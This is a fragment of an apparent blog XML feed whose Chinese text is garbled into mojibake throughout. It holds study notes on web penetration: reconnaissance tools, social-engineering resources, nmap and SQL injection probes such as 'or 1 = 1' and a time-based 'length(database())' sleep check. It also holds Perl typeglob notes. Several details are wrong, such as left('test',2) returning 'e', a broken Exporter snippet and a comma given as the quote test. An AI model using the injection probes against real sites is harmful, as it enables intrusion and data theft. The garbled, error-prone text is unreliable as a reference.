è¯†åˆ«</h1><p>è¿™é‡Œçš„æŒ‡çº¹ä¸æ˜¯æ‰‹çš„æŒ‡çº¹è¯†åˆ«.</p><p>å¯åŠ å…¥ç«¯å£æ‰«æ, æ•æ„Ÿæ–‡ä»¶æ‰«æçš„æ“ä½œ.</p><p>å·¥å…·, å¦‚:</p><ul><li>å¾¡å‰‘ Web æŒ‡çº¹è¯†åˆ«ç³»ç»Ÿ, å¯å¾—çŸ¥ç½‘ç«™ç”¨çš„æ¡†æ¶ä¿¡æ¯ä»¥åŠç‰ˆæœ¬ä¿¡æ¯, ä»è€ŒæŸ¥è¯¢å…¶æ˜¯å¦å­˜åœ¨æ¼æ´, è¿›è¡Œæ”»å‡»</li><li>åœ¨çº¿æŒ‡çº¹è¯†åˆ«å·¥å…·, <code>whatweb.bugscaner.com</code>, <code>www.yunsee.cn/finger.html</code></li></ul><p>WAF (Web Application Firewall) æŒ‡ç½‘ç»œé˜²ç«å¢™çš„è¯†åˆ«, å¯åœ¨ Github ä¸Šæ‰¾, å¦‚ <code>EnableSecurity/wafw00f</code></p><p>CDN (Content Delivery Network) è¯†åˆ«å¯åœ¨ Github ä¸ŠæŸ¥æ‰¾, å¦‚ <code>xcdn</code></p><p>åŒºå—é“¾æ¼æ´å¹³å°: <code>www.bugx.org</code></p><p>CNVD å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å¹³å°: <code>www.cnvd.org.cn</code></p><p>æ¼æ´é“¶è¡Œ: <code>www.bugbank.cn</code></p><p>360 è¡¥å¤©å¹³å° <code>www.butian.net</code>.</p><p>å›½å¤–çš„ä¸€äº›å¹³å°: </p><ul><li><code>www.hackerone.com</code></li><li><code>www.0day.today</code></li><li><code>routerpwn.com</code></li><li><code>cve.mitre.org</code></li></ul><p>å¨èƒæƒ…æŠ¥:</p><ul><li>å®‰å…¨æ•°æ®äº¤æµå¹³å°, å¦‚åä¸ºå®‰å…¨æƒ…æŠ¥</li><li>è¢«é»‘ç«™ç‚¹ç»Ÿè®¡, å¦‚ <code>www.hacked.com.cn</code></li></ul><p>ç¤¾å·¥åº“, å¦‚:</p><ul><li>å¾®ä¿¡ä¼ªé€ </li><li>ä»»æ„é‚®ç®±å‘é€</li><li>ä¸´æ—¶é‚®ç®±</li><li>é‚®ç®±æ± ç¾¤</li><li>ç¤¾å·¥åº“</li></ul><p>GoogleHack.</p><h1 id="èµ„äº§æ¢³ç†"><a href="#èµ„äº§æ¢³ç†" class="headerlink" title="èµ„äº§æ¢³ç†"></a>èµ„äº§æ¢³ç†</h1><p>æ¢³ç†çš„ç›®çš„æ˜¯ä¸ºäº†åˆ¤æ–­è¿™äº›åŸŸåæ˜¯å¦éƒ½å­˜æ´». å­˜æ´»å°±ç»§ç»­è¿›è¡Œ IP åœ°å€ç¡®è®¤.</p><p>æ ¹æ® IP åœ°å€çš„åˆ†å¸ƒ, ç¡®å®šä¼ä¸šçš„å…¬ç½‘ç½‘æ®µ.</p><h1 id="Google-ä¼˜åŠ¿åŠ£åŠ¿"><a href="#Google-ä¼˜åŠ¿åŠ£åŠ¿" class="headerlink" title="Google ä¼˜åŠ¿åŠ£åŠ¿"></a>Google ä¼˜åŠ¿åŠ£åŠ¿</h1><p>ä¼˜ç‚¹:</p><ul><li>åªè¦æœ‰ä¸€å°èƒ½è®¿é—® Google çš„è®¾å¤‡, éƒ¨ç½²ç›¸å¯¹ç®€å•.</li><li>èµ„æºä¸°å¯Œ</li></ul><p>åŠ£åŠ¿:</p><ul><li>æœç´¢å…³é”®è¯å¤š, è®°å¿†å¤æ‚</li><li>ä¸èƒ½ç¦»çº¿</li></ul><h1 id="Nmap-å’Œå®æˆ˜æ¡ˆä¾‹"><a href="#Nmap-å’Œå®æˆ˜æ¡ˆä¾‹" class="headerlink" title="Nmap å’Œå®æˆ˜æ¡ˆä¾‹"></a>Nmap å’Œå®æˆ˜æ¡ˆä¾‹</h1><p>Nmap æ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯å£æ‰«æè½¯ä»¶. ç”¨æ¥æ‰«æç”µè„‘ä¸Šå¼€å‘çš„ç½‘ç»œè¿æ¥ç«¯å£. ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥çš„ç«¯å£, å¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œçš„æ“ä½œç³»ç»Ÿ.</p><p>é¦–å…ˆéœ€è¦<mark>ä¸»æœºå‘ç°</mark>. å†æ‰«æ. nmap æ”¯æŒå¤šç§å‘ç°ä¸»æœºæ—¶å‘é€çš„åŒ….</p><p>ä¼¼ä¹æ²¡æœ‰å•ç‹¬çš„ <code>-s</code> å‚æ•°, åªæœ‰ <code>-sL</code> ç­‰, è¿™é‡Œçš„ <code>s</code> ä¸º â€œscanâ€, <code>L</code> ä¸º â€œListâ€. å³åˆ—è¡¨æ‰«æ.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-comment"># åªè¿›è¡Œä¸»æœºå‘ç°</span><br>$ nmap -sn 10.1.1.1-100<br></code></pre></td></tr></table></figure><h1 id="SQL-æ³¨å…¥åŸºç¡€"><a href="#SQL-æ³¨å…¥åŸºç¡€" class="headerlink" title="SQL æ³¨å…¥åŸºç¡€"></a>SQL æ³¨å…¥åŸºç¡€</h1><p>æŸ¥çœ‹ SQL æ’å: <code>https://db-engines.com/en/ranking</code></p><p>æŸ¥çœ‹ MySQL ä¸­çš„ç”¨æˆ·:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>, host <span class="hljs-keyword">from</span> mysql.user;<br></code></pre></td></tr></table></figure><p>(å®æµ‹éœ€è¦ root æƒé™)</p><p>è¿™æ¡è¯­å¥ä¸­çš„ <code>mysql.user</code> è¡¨æ˜ <code>mysql</code> è¿™ä¸ªæ•°æ®åº“é‡Œé¢æœ‰ä¸€ä¸ªè¡¨å« <code>user</code>.</p><p>å‡ ä¸ªé‡è¦çš„åº“:</p><p><img src="/../img/important_repo_of_mysql.png"></p><p><code>infomation_schema</code> åº“ä¸­çš„é‡è¦è¡¨æœ‰:</p><ul><li><code>COLUMNS</code></li><li><code>SCHEMATA</code></li><li><code>TABLES</code></li></ul><p><mark>æ³¨é‡Š</mark>, ä½¿ç”¨ <code>-- </code> æ³¨æ„æœ‰ä¸€ä¸ªç©ºæ ¼. æˆ– <code>#</code></p><p><mark>åˆ›å»ºç”¨æˆ·</mark>, <code>CREATE USER test@test IDENTIFIED BY &quot;123&quot; with_native_password;</code></p><p><code>select now();</code> å¯ä»¥æŸ¥çœ‹æ—¶é—´.</p><p><code>select database();</code> å¯ä»¥æŸ¥çœ‹å½“å‰é€‰æ‹©çš„æ˜¯å“ªä¸ªåº“.</p><p><code>select VERSION();</code> æŸ¥çœ‹ç‰ˆæœ¬.</p><p><code>select USER();</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·.</p><p><code>select @@datadir</code> æŸ¥çœ‹æ•°æ®è·¯å¾„.</p><p><code>select @@basedir</code> æŸ¥çœ‹ mysql å®‰è£…è·¯å¾„.</p><p><code>select @@version_compile_os</code> æŸ¥çœ‹ mysql å®‰è£…çš„ç³»ç»Ÿ.</p><p>åˆ›å»ºåº“: <code>CREATE DATABASE test CHARSET utf8mb4;</code></p><p>åˆ›å»ºè¡¨: <code>CREATE TABLE t1 (data1 INT);</code></p><p>åˆ é™¤è¡¨: <code>DROP TABLE t1;</code></p><p>ä¿®æ”¹è¡¨: <code>ALTER TABLE t1 ADD NAME VARCHAR(32);</code></p><p>æ’å…¥æ•°æ®: <code>INSERT INTO t1 VALUES (1, &quot;first&quot;), (2, &quot;second&quot;), (3, &quot;third&quot;);</code></p><p>å¯åˆ©ç”¨ <code>UNION</code> æ¥ç¡®å®šæ•°æ®åº“ä¸€ä¸ªè¡¨ä¸­æœ‰å¤šå°‘ä¸ªå­—æ®µ.</p><p><mark>Web ç¨‹åºå±‚æ¶æ„</mark> : </p><ul><li>ç•Œé¢å±‚, ç”¨æˆ·ç”µè„‘, å‰ç«¯æœåŠ¡å™¨</li><li>ä¸šåŠ¡é€»è¾‘å±‚, åç«¯æœåŠ¡å™¨</li><li>æ•°æ®è®¿é—®å±‚, SQL æœåŠ¡å™¨</li></ul><p>å¦‚æœè®¿é—®é¡µé¢æ—¶, å‡ºç° <code>You have an error in your SQL syntax</code> è¿™ç±»æŠ¥é”™, è¯¥é¡µé¢å¯ä»¥æ¨æ–­å‡ºæœ‰ SQL æ³¨å…¥æ¼æ´.</p><p>é¶åœºç¯å¢ƒ <code>bwapp</code>.</p><p>ç”¨ <code>POST</code> æ–¹æ³•è¯·æ±‚æ—¶, url ä¸­ä¸ä¼šå‡ºç°æŸ¥è¯¢.</p><p><code>cookies</code> å¯ä»¥ç”¨æ¥åˆ¤æ–­ç™»å½•çŠ¶æ€.</p><p>å·¥å…·: Postman</p><p>å¯ä»¥é€šè¿‡æ‰¾åˆ° database -&gt; tables -&gt; columns</p><p>å°†ä¸€ä¸ª column ä¸­çš„æ‰€æœ‰å†…å®¹æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> GROUP_CONCAT(<span class="hljs-keyword">column</span> name) <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;table name&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯†ç åŠ å¯†ä¸º <code>cmd5</code>, ä¸Š <code>cmd5.com</code> å¯ç ´è§£.</p><h2 id="åˆ¤æ–­-SQL-æ³¨å…¥ç‚¹"><a href="#åˆ¤æ–­-SQL-æ³¨å…¥ç‚¹" class="headerlink" title="åˆ¤æ–­ SQL æ³¨å…¥ç‚¹"></a>åˆ¤æ–­ SQL æ³¨å…¥ç‚¹</h2><p>ç»å…¸çš„å•å¼•å·åˆ¤æ–­æ³•: åœ¨æŸ¥æ‰¾ç•Œé¢è¾“å…¥ <code>,</code>, è‹¥æŠ¥é”™ (å¼•å·ä¸ªæ•°ä¸åŒ¹é…å¯¼è‡´æŠ¥é”™) åˆ™å¯ä»¥åˆ¤æ–­æœ‰ sql æ³¨å…¥æ¼æ´. (ç¼ºç‚¹: å¿…é¡»è¦æœ‰å›æ˜¾æ‰èƒ½åˆ¤æ–­)</p><p>é€šå¸¸æ³¨å…¥ç±»å‹åˆ†ä¸ºä¸¤ç§ç±»å‹, ä¸€ç§å­—ç¬¦ä¸²ç±»å‹, ä¸€ç§æ•°å­—ç±»å‹, åˆ¤æ–­å¦‚:</p><ul><li><code>select * from table_name where something = &#39;1&#39; and 1 = 1</code></li><li><code>select * from table_name where something = 1 and 1 = 1</code></li></ul><h1 id="SQL-æ³¨å…¥ç›²æ³¨-Injection-Blind"><a href="#SQL-æ³¨å…¥ç›²æ³¨-Injection-Blind" class="headerlink" title="SQL æ³¨å…¥ç›²æ³¨ Injection Blind"></a>SQL æ³¨å…¥ç›²æ³¨ Injection Blind</h1><p>SQL æ³¨å…¥ç±»å‹:</p><ul><li>UNION query injection</li><li>Boolean-based blind SQL injection, å¦‚ <code>or 1 = 1</code>, è¿™æ˜¯ä¸€ä¸ªè¡¡ä¸ºçœŸçš„æ¡ä»¶</li><li>Error-based SQL injection</li><li>Time-based blind SQL injection, å¦‚ <code>and sleep(10)</code>, <code>sleep</code> æ˜¯æ¯æŸ¥è¯¢ä¸€æ¡ <code>sleep</code> 10 ç§’</li><li>Stacked queries SQL injection, æ³¨å…¥å¤šæ¡è¯­å¥</li></ul><p>å¸¸è§å‡½æ•°:</p><ul><li><code>substr</code>, <code>mid</code>, å¦‚ <code>select substr(&#39;test&#39;, 1, 1)</code> è¿”å› <code>t</code>, å³ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹å–, å–ä¸€ä¸ª.</li><li><code>length</code>, å¦‚ <code>select length(&#39;test&#39;)</code>  è¿”å› 4</li><li><code>ascci</code>, <code>ord</code>, å¦‚ <code>select ascii(&#39;test&#39;)</code>, è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç </li><li><code>count</code>, å¦‚ <code>select count(*) from test</code>, æœ‰å¤šå°‘æ¡æ•°æ®å°±è¿”å›å‡ </li><li><code>left</code>, å¦‚ <code>select left(&#39;test&#39;, 2)</code>, è¿”å› <code>e</code>, ä»æœ€å·¦è¾¹å–å‡ ä¸ª</li></ul><p>åˆ¤æ–­æ•°æ®åº“åç§°é•¿åº¦, å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">... <span class="hljs-keyword">and</span> length(database()) <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-polipo</title>
    <link href="/2023/01/09/%E4%BB%80%E4%B9%88%E6%98%AF-polipo/"/>
    <url>/2023/01/09/%E4%BB%80%E4%B9%88%E6%98%AF-polipo/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Mastering-Perl-Notes</title>
    <link href="/2023/01/09/Mastering-Perl-Notes/"/>
    <url>/2023/01/09/Mastering-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸ƒç« -Symbol-Tables-and-Typeglobs"><a href="#ç¬¬ä¸ƒç« -Symbol-Tables-and-Typeglobs" class="headerlink" title="ç¬¬ä¸ƒç«  Symbol Tables and Typeglobs"></a>ç¬¬ä¸ƒç«  Symbol Tables and Typeglobs</h1><p>Symbol tables ç»„ç»‡å’Œå­˜å‚¨è¿™ Perlâ€™s package (global) å˜é‡.</p><p>å¯ä»¥ç”¨ typeglobs æ¥å½±å“ symbol tables.</p><h2 id="package-and-Lexical-Variables-åŒ…å’Œè¯æ³•å˜é‡"><a href="#package-and-Lexical-Variables-åŒ…å’Œè¯æ³•å˜é‡" class="headerlink" title="package and Lexical Variables (åŒ…å’Œè¯æ³•å˜é‡)"></a>package and Lexical Variables (åŒ…å’Œè¯æ³•å˜é‡)</h2><p>Symbol table ä¼šè¿½è¸ª package variables è€Œä¸ä¼šè¿½è¸ª Lexical variables.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $test = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;*test<span class="hljs-string">&#123;SCALAR&#125;</span>&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¸ä¼šæœ‰è¾“å‡º.</p><p>è€Œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$test = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$&#123;*test<span class="hljs-string">&#123;SCALAR&#125;</span>&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>åˆ™è¾“å‡º 1.</p><p>å¤„ç† symbol table æˆ– typeglobs , å°±æ˜¯å¤„ç† package variables. åŒ…å˜é‡ä¹Ÿæ˜¯ global variables.</p><p>Perl å¤„ç† double use of package variables çš„æ–¹å¼, å¯ä»¥åˆ©ç”¨ <code>local</code>. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">$n = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">my</span> $square = square( <span class="hljs-number">15</span> );<br><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;n is $n, square is $square\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">square</span> </span>&#123; <span class="hljs-keyword">local</span> $n = <span class="hljs-keyword">shift</span>; $n ** <span class="hljs-number">2</span>; &#125;<br></code></pre></td></tr></table></figure><h2 id="Getting-the-Package-Version"><a href="#Getting-the-Package-Version" class="headerlink" title="Getting the Package Version"></a>Getting the Package Version</h2><p>å¯éšæ—¶ç”¨ full package name æ¥è®¿é—®åŒ…å˜é‡.k</p><p>å¦‚ <code>$main::global</code>.</p><p><code>our</code> å‘Šè¯‰ Perl åœ¨æ¥ä¸‹æ¥çš„ scope ä¸­éƒ½ä½¿ç”¨è¿™ä¸ªåŒ…å˜é‡.</p><h2 id="The-Symbol-Table-ç¬¦å·è¡¨"><a href="#The-Symbol-Table-ç¬¦å·è¡¨" class="headerlink" title="The Symbol Table (ç¬¦å·è¡¨)"></a>The Symbol Table (ç¬¦å·è¡¨)</h2><p>æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ª special hash-like data structure å«åšç¬¦å·è¡¨, å…¶è¿˜åŒ…æ‹¬åŒ…ä¸­çš„æ‰€æœ‰çš„ stashes. stash å³å˜é‡è¡¨, ä¸€ä¸ª stash å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ (ä¸æ˜¯ä¼ ç»Ÿä¸Šçš„ Perl å“ˆå¸Œ, åªæ˜¯ç±»ä¼¼), é‡Œé¢å­˜æ”¾åŒ…ä¸­å®šä¹‰çš„å…¨éƒ¨å˜é‡. (stash æ²¡æœ‰å…¬è®¤çš„ä¸­æ–‡ç¿»è¯‘)</p><p> è¿™ä¸ª stash å¹¶ä¸æ˜¯ä¼ ç»Ÿä¸Š Perl çš„ hash. å…¶å‘½åä¸º package name + <code>::</code>, å¦‚ <code>%main::</code>.</p><p>æ‰“å°ä¸€ä¸ªç¬¦å·è¡¨ä¸­çš„æ‰€æœ‰å†…å®¹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $entry ( <span class="hljs-keyword">keys</span> %main:: ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$entry\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>%main::</code> ç¬¦å·è¡¨è¿˜åŒ…å«äº†æ‰€æœ‰å…¶ä»–çš„ç¬¦å·è¡¨.</p><p>ä¹Ÿå¯ä»¥å¯¹ stash è¿›è¡Œå…¶ä»–å“ˆå¸Œæ“ä½œ. å¦‚ç”¨ <code>delete</code> åˆ é™¤è¡¨ä¸­çš„å…ƒç´ .</p><h2 id="Typeglob"><a href="#Typeglob" class="headerlink" title="Typeglob"></a>Typeglob</h2><p>æ€»å…±æœ‰ä¸ƒä¸­å˜é‡ç±»å‹:</p><ul><li>SCALAR</li><li>ARRAY</li><li>HASH</li><li>CODE - <code>&amp;foo</code></li><li>IO - æ–‡ä»¶å’Œç›®å½•å¥æŸ„</li><li>GLOB - <code>*foo</code></li><li>FORMAT - æ ¼å¼å</li><li>PACKAGE</li></ul><p>å¯ä»¥åƒä½¿ç”¨å“ˆå¸Œä¸€æ ·ä½¿ç”¨ <code>GLOB</code> ç±»å‹, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br>$bar = <span class="hljs-string">&#x27;Buster&#x27;</span>;<br>@bar = <span class="hljs-string">qw(Mini Roscoe)</span>;<br><br>$foo = *bar<span class="hljs-string">&#123;SCALAR&#125;</span>; <span class="hljs-comment"># è¿”å›å¼•ç”¨</span><br>$baz = *bar<span class="hljs-string">&#123;ARRAY&#125;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\$foo is $$foo&quot;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\$baz is @$baz&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿”å›çš„æ˜¯å¼•ç”¨. </p><p>å³ä½¿ä¸€ä¸ªå˜é‡ä»æ¥æ²¡ä½¿ç”¨è¿‡, å…¶ <code>GLOB</code> è¿”å›çš„å§‹ç»ˆæ˜¯ä¸€ä¸ªåŒ¿åæ ‡é‡å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br>$foo = *bar<span class="hljs-string">&#123;SCALAR&#125;</span>;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;$foo is a reference&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">ref</span> $foo;<br></code></pre></td></tr></table></figure><p>stash åªèƒ½ä½œä¸ºå³å€¼ä½¿ç”¨, ä¸èƒ½ä½œä¸ºå·¦å€¼ä½¿ç”¨, ä¸ç„¶ä¼šæŠ¥é”™:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*bar<span class="hljs-string">&#123;SCALAR&#125;</span> = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>ä½†å¯ä»¥å°†å…¶ä½œä¸ºæ•´ä½“èµ‹å€¼. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*foo = *bar;<br></code></pre></td></tr></table></figure><p><mark>æ£€æµ‹ä¸€ä¸ªåŒ…å˜é‡æ˜¯å¦å·²ç»åœ¨æŸå¤„è¢«ä½¿ç”¨çš„ä¸€ä¸ªæ–¹æ³•</mark> :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $entry ( <span class="hljs-keyword">sort</span> <span class="hljs-keyword">keys</span> %main:: ) &#123;<br>    <span class="hljs-keyword">say</span> $entry;<br><br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\tarray is defined&quot;</span> <span class="hljs-keyword">if</span> *&#123;$entry&#125;<span class="hljs-string">&#123;ARRAY&#125;</span>;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\thash is defined&quot;</span> <span class="hljs-keyword">if</span> *&#123;$entry&#125;<span class="hljs-string">&#123;HASH&#125;</span>;<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\tsub is defined&quot;</span> <span class="hljs-keyword">if</span> *&#123;$entry&#125;<span class="hljs-string">&#123;CODE&#125;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ <code>typeglob</code> ç±»ä¼¼ä¸å“ˆå¸Œ, å…¶ä¸­çš„å€¼ä¸ºå¼•ç”¨.</p><h3 id="åˆ«å"><a href="#åˆ«å" class="headerlink" title="åˆ«å"></a>åˆ«å</h3><p>é€šè¿‡å°†ä¸€ä¸ª <code>typeglob</code> èµ‹å€¼ç»™å¦ä¸€ä¸ª <code>typeglob</code>, å°±å¯ä»¥åˆ›å»ºå˜é‡çš„åˆ«å.</p><p>å•ä¸ªç±»å‹, å°±ä¼ é€’å•ä¸ªç±»å‹çš„å¼•ç”¨. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*foo = \$scalar;<br></code></pre></td></tr></table></figure><p>çœ‹è¿™æ®µä»£ç :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><span class="hljs-keyword">use</span> strict;<br><br><span class="hljs-keyword">my</span> $scalar = <span class="hljs-string">&#x27;foo&#x27;</span>;<br><span class="hljs-keyword">my</span> @array  = <span class="hljs-number">1</span> .. <span class="hljs-number">5</span>;<br><br>*foo = \$scalar;<br>*foo = \@array;<br><br>&#123;<br><span class="hljs-keyword">no</span> strict <span class="hljs-string">&#x27;var&#x27;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\$foo is $foo&quot;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;\@foo is @foo&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>strict</code> å¯¹ <code>*foo</code> ä¸èµ·ä½œç”¨, åªå¯¹ <code>$foo</code> å’Œ <code>@foo</code> ç®¡ç”¨.</p><p><code>Exporter</code> ä¹Ÿæ˜¯ä»åŒ…ä¸­è·å–çš„å˜é‡ç„¶åå°†å˜é‡åèµ‹å€¼ç»™è¦å¯¼å…¥åŒ…çš„ <code>typeglob</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Exporter;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">import</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $pkg = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $callpkg = <span class="hljs-keyword">caller</span>($ExporterLevel);<br><br>    <span class="hljs-comment">#...</span><br>    *(<span class="hljs-string">&quot;$callpkg\::$_&quot;</span>) = \&amp;(<span class="hljs-string">&quot;pkg\::$_&quot;</span>) <span class="hljs-keyword">foreach</span> @_;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ—§ä»£ç ä¸­çš„æ–‡ä»¶å¥æŸ„å‚æ•°"><a href="#æ—§ä»£ç ä¸­çš„æ–‡ä»¶å¥æŸ„å‚æ•°" class="headerlink" title="æ—§ä»£ç ä¸­çš„æ–‡ä»¶å¥æŸ„å‚æ•°"></a>æ—§ä»£ç ä¸­çš„æ–‡ä»¶å¥æŸ„å‚æ•°</h3><p>åœ¨ Perl 5.6 åŠ å…¥å¯¹æ–‡ä»¶å¥æŸ„çš„å¼•ç”¨ä¹‹å‰, å¦‚æœéœ€è¦ç»™ä¸€ä¸ªå­ç¨‹åºä¼ é€’ä¸€ä¸ªæ–‡ä»¶å¥æŸ„, å°±åªèƒ½ä½¿ç”¨ <code>typeglob</code>.</p><p>æ—§ä»£ç å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<br><br><span class="hljs-keyword">open</span> FH, $cgi_data_file<br>    <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not open $cgi_data_file: $!&quot;</span>;<br><br>    CGI-&gt;new( *FH ); <span class="hljs-comment"># ä¸èƒ½ new( FH ), éœ€è¦ typeglob</span><br></code></pre></td></tr></table></figure><p>æ–°ä»£ç å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> CGI;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $fh, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $cgi_data_file<br>    <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Could not 